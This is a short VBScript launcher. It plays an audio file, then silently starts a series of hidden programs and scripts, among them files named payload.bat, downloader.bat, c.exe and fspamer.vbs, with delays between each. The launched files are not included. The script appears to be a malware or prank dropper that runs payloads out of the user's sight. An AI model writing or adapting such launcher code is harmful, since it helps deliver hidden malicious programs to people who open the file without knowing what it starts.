set pl=CreateObject("WMPlayer.OCX")

pl.URL = "voice.mp3"
pl.controls.play
while pl.playState <> 1 ' 1 = stopped
  wscript.Sleep 100
wend
createobject("Wscript.shell").run "payload.bat",0
createobject("Wscript.shell").run "downloader.bat",0
createobject("Wscript.shell").run "W.docx",0
wscript.sleep 2000
createobject("Wscript.shell").run "wp.bat",0
createobject("Wscript.shell").run "plan_cum.exe",0
wscript.sleep 6000
createobject("Wscript.shell").run "c.exe",0
wscript.sleep 7000
createobject("Wscript.shell").run "fspamer.vbs",0
createobject("Wscript.shell").run "c.exe",0